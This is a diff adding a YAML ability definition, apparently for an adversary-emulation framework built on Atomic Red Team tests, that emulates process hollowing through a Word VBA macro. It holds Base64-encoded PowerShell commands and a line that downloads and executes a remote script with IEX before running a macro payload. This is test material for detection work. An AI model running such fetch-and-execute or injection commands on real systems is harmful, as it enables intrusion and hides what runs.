@@ -1,0 +1,13 @@
+- id: 1115a2a1-c02b-5d5e-8e1a-e38096595893
+  name: Soumaia ART Tests - RunPE via VBA
+  description: This module executes notepad.exe from within the WINWORD.EXE process
+  tactic: stealth
+  technique:
+    attack_id: T1055.012
+    name: 'Process Injection: Process Hollowing'
+  platforms:
+    windows:
+      psh:
+        command: "powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA\n}\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \".\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\""
+        payloads:
+        - T1055.012-macrocode.txt
